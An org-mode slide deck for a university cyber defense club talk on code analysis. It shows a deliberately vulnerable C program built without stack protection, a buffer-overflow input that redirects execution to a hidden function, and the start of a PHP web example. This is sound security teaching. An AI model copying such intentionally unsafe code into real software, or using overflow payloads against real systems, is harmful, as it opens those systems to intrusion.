2022-02-03/Presentation.org
#+TITLE: LUCDC: Code Analysis
#+OPTIONS: toc:nil
#+AUTHOR: Andrew Rioux
#+EMAIL: arioux@liberty.edu
#+REVEAL_ROOT: https://cdn.jsdelivr.net/npm/reveal.js
#+REVEAL_PLUGINS: (notes)
#+REVEAL_DEFAULT_SLIDE_BACKGROUND: ../common/background.png
#+REVEAL_EXTRA_CSS: ../common/theme.css
#+REVEAL_INIT_OPTIONS: transition: 'none'
#+REVEAL_TITLE_SLIDE_BACKGROUND: ../common/background.png
#+REVEAL_TITLE_SLIDE: <h1>%t</h1>
#+REVEAL_TITLE_SLIDE: %a (%e)

* About me
#+ATTR_REVEAL: :frag (appear appear appear appear)
- Andrew Rioux
- CS: Software Engineering (Sophomore)
- Software Engineer for US Navy
- LU CDC Vice President
* Presentation information
** Located at the following git repository
[[https://github.com/r-a303931/lucdc-presentations]]

** Example 1
- Build: ~docker-compose run example1_build~ (or ~make~ in [[./example1]])
- Run: ~docker-compose run example1~

** Example 2
- Start web server: ~docker-compose up example2~

* Life Goals
What do you plan to do after graduation?
#+ATTR_REVEAL: :frag appear
- Penetration testing?
- Security engineer?
- Software Engineer / Programmer?

* What are you going to deal with in your day to day job?
#+ATTR_REVEAL: :frag appear
Code!

* What we will be going over here
#+ATTR_REVEAL: :frag (appear appear appear appear appear)
- Example 1: Too simple with no safety (C)
- Example 2: Too complex with fake safety (PHP)
- What can we learn?
- Club exercise (JS)!

* Example 1: Too simple with no safety
** Source code:
#+BEGIN_SRC c
#include <stdio.h>
// It's a surprise tool that will help us later...
void shell() {
    printf("Suspicious function here...\n");
}
void get_name() {
    printf("What is your name?\n");
    char buffer[20];
    scanf("%s", buffer);
    printf("Hello, %s!\n", buffer);
}
int main() {
    get_name();
}
#+END_SRC

** How is this compiled?
#+BEGIN_SRC makefile
example1: example1.c
	gcc -no-pie --no-stack-protector -o example1 example1.c
#+END_SRC

** Options of interest
#+ATTR_REVEAL: :frag appear
- ~-no-pie~
#+ATTR_REVEAL: :frag appear
- ~--no-stack-protector~

** We know ~shell~ is bad
But it's benign....
#+ATTR_REVEAL: :frag appear
right?

** Nope!
What if your name is ~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x0\x0\x0\x0\x0~?

** What happened?
#+ATTR_REVEAL: :frag appear
Buffer overflow exploit!

** What could happen?
* Example 2: Too complex with fake safety
PHP has some magic variable management
#+ATTR_REVEAL: :frag appear
...can this be taken advantage of?

** Aside: How HTTP works
#+ATTR_REVEAL: :frag appear
You make a request, and get a response

*** Get me a file, please!
*** Post to this location and do a thing!
*** How do we handle that in PHP?
#+ATTR_REVEAL: :frag (appear appear)
- ~$_GET~
- ~$_POST~
** Aside: PHP in 5 seconds for C++ programmers
#+ATTR_REVEAL: :frag appear
Every variable begins with ~$~

#+ATTR_REVEAL: :frag appear
Every PHP file begins with ~<?php~

#+ATTR_REVEAL: :frag appear
No main function, everything just happens in the order it's displayed

#+ATTR_REVEAL: :frag appear
Other than that, basically C++!
** Source code: Input check
#+BEGIN_SRC php
<?php
    if (empty($_POST['hmac']) || empty($_POST['host'])) {
        header('HTTP/1.0 400 Bad Request');
        exit;
    }
#+END_SRC

